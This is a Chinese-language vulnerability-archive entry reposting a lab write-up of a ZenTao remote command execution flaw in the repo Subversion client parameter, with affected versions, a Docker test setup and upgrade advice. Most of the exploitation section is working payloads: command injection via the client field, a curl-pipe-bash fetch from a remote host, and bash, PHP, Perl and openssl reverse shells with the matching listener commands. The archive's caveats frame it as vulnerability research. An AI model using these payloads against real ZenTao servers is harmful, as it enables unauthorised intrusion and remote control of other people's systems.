---
source: "MrWQ/vulnerability-paper"
title: "禅道ZenTao repo Subversion client执行及多种反连示例"
product: "禅道ZenTao"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "开源17.4–18beta1/旗舰3.4–4beta1/企业7.4–8beta1，Docker18beta1实验"
prerequisites: "前置会话绕过步骤仅图片/未文本说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/jfxJSx1diFrpXTFXi3SNGQ"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%A6%85%E9%81%93/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20%E5%88%A9%E7%94%A8%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%20RCE%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8F%8D%E5%BC%B9%20shell.md"
id: "vw-b5d67ae893df180b5c5c29b6"
entity_id: "ve-b5d67ae893df180b5c5c29b6"
schema_version: "1"
---

# 禅道ZenTao repo Subversion client执行及多种反连示例

## 条目说明

- 对象与具体问题：禅道ZenTao；repo Subversion client执行及多种反连示例
- 版本、配置及部署条件：开源17.4–18beta1/旗舰3.4–4beta1/企业7.4–8beta1，Docker18beta1实验
- 认证与权限前提：前置会话绕过步骤仅图片/未文本说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 需链接明确captcha或认证前提
- 说payload必须无&却后续PHP/Perl/openssl多含&，实际表单编码与shell层级问题，绝对结论矛盾
- Docker不必都是精简环境或无wget/ifconfig，列测试镜像条件而非普遍限制
- 模板命令与#样例粘连，弱MYSQL_ROOT_PASSWORD仅隔离实验；外部下载shell/证书/命名管道有副作用
- 修复>beta1过宽需具体安全发布/公告，不能保证每后续分支

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jfxJSx1diFrpXTFXi3SNGQ)

**0x00**

漏洞爆出来已经有些日子了，今天实测了一下，记录一下测试过程。

**0x01 影响范围**  

开源版：17.4<= 禅道 <=18.0.beta1

旗舰版：v3.4 <= 禅道 <= v4.0.beta1

企业版：v7.4 <= 禅道 <= v8.0.beta1

**0x02 环境搭建**

可以通过 docker 快速搭建 18.0.beta1 版本有漏洞的环境。

1、拉取 docker 镜像  

<table><tbody><tr><td width="557" valign="top"><p>docker pull easysoft/zentao:18.0.beta1</p></td></tr></tbody></table>

2、创建 docker 网络驱动

<table><tbody><tr><td width="557" valign="top"><p>docker network create --subnet=[ip 范围] [网络驱动名]</p><p>#docker network create --subnet=172.172.172.0/24 zentaonet</p></td></tr></tbody></table>

3、启动容器  

<table><tbody><tr><td width="557" valign="top"><p>docker run --name [容器名] -p [主机端口]:80 --network=[网络驱动名] --ip [容器 IP] --mac-address [mac 地址] -v [主机禅道目录]:/www/zentaopms -v [主机 mysql 目录]:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=[数据库密码] -d easysoft/zentao:[镜像标签]</p><p>#docker run --name zentao -p 80:80 --network=zentaonet --ip 172.172.172.172 --mac-address 02:42:ac:11:00:00 -v /www/zentaopms:/www/zentaopms -v /www/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d easysoft/zentao:18.0.beta1</p></td></tr></tbody></table>

执行完上面 3 条命令后，浏览器直接访问 http:// 宿主机 ip: 宿主机映射端口，一直点下一步即可完成配置。

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDHB4picBeyFtS2opNCrYYCd7iaO3dVbYqN5YickCjXXE7jCGULibYaIia6LA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxD5XAF3x2bYckyCbZaFjLy0Dy4Z98LRLRhjdO0fgv7S7qjZWqOXRxOaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDZ4OsxWEmZGCu4BFdYWSFmmqm3ypl3M6xvUVm4pqkWENtncxV9iajJHw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxD5ib8iaAysgQibqzvseWyGqcc1VfITRpXSBlUFEB4ws3XvCuNoy7JXArJw/640?wx_fmt=png)

**0x03 漏洞利用**

payload：SCM=Subversion&client=`id`

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDJ3M9oLCjsV4jt7B3pNRLmic8RM4VicMKnibf0icxYsrSlpWI7oxxaCYMPg/640?wx_fmt=png)

在实战中，只是执行 id 命令还是不够的，下面尝试一下反弹 shell，在实战过程中，发现常规的反弹 shell 命令执行不成功，经过测试后发现，在此处命令执行的时候，如果 payload 中带有 & 符号，则 payload 会被截断。

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDP1jqLnoRL8SAGocGPjozzelxaqHTSVvWE4VCLPeaTvJbUkEKOaUJicg/640?wx_fmt=png)

所以，当我们使用类似 “bash -i>& /dev/tcp/xx.xx.xx.xx/9999 0>&1” 的 payload 时，服务端只会执行 “bash -i >” 命令，无法完整执行反弹 shell 的命令。

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxD2JE3CqRAJiatNUqblTiayBRN8PTkGHib0hmD2LQUDF1DV3TFBQDibibue4Q/640?wx_fmt=png)

想要成功反弹 shell，payload 中必须不能有 & 符号。这时候可以考虑用远端加载 payload 到本地的方式执行。

在真实的环境中，很多都是采用 docker 部署的，使用 docker 的环境使用的是精简版 linux，很多命令不支持，像 ifconfig、wget 这类命令用不了，实测 curl 命令可以使用，将反弹 shell 的命令写在 1.txt 文件中，通过 curl 拉取后执行。

<table><tbody><tr><td width="557" valign="top"><p>payload：curl http://10.19.71.100:8888/1.txt|bash</p></td></tr></tbody></table>

虽然服务端报错，但是命令成功执行。

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDJPibV6PrwlqpViaz5C3cUVaWP4mJg37MbYMkmBqHicw3vxMHLHghEwKdA/640?wx_fmt=png)

禅道是 php 开发的，所以 php 脚本也可以：

<table><tbody><tr><td width="557" valign="top"><p>payload：php -r '$sock=fsockopen("xx.xx.xx.xx",xx);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDpG6IQrIVOyJLhGgrp09iaqD9FT5bCBvIzibXyV3muNgfhFwn9PdR1rgQ/640?wx_fmt=png)

测试发现 docker 里还有 perl 环境，所以 perl 脚本也可以：

<table><tbody><tr><td width="557" valign="top"><p>payload：perl -e 'use Socket;$i="xx.xx.xx.xx";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDZ1Pxr1MWq9GjNMaex7VAdK99YOYicjQS1TKFAGUg5NZ6ZibsyMFMyN6w/640?wx_fmt=png)

在 docker 中还支持 openssl，所以还可以使用 openssl 反弹加密的 shell。  

首先配置攻击机，生成证书：

<table><tbody><tr><td width="557" valign="top" height="38"><p>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</p></td></tr></tbody></table>

再使用 openssl 开启监听：

<table><tbody><tr><td width="557" valign="top"><p>openssl s_server -quiet -key key.pem -cert cert.pem -port 9999</p></td></tr></tbody></table>

目标机器上要执行的 payload：

<table><tbody><tr><td width="557" valign="top"><p>mkfifo /tmp/s; /bin/sh -i &lt;/tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect xx.xx.xx.xx:9999 &gt; /tmp/s; rm /tmp/s</p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_png/IlslviaDrQibNrP37lic7SugadXtRv3akxDubFe2LyD6RgJ9mdibpxTkhhsedXkCK5gBscIYoOgvpT4gtiaBoDFYzAQ/640?wx_fmt=png)

Over~

**0x04 修复建议**

目前官方已经发布新版修复了该漏洞，升级到以下版本即可修复：  

禅道 > v18.0.beta1（开源版）

禅道 > v4.0.beta1（旗舰版）

禅道 > v8.0.beta1（企业版）

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
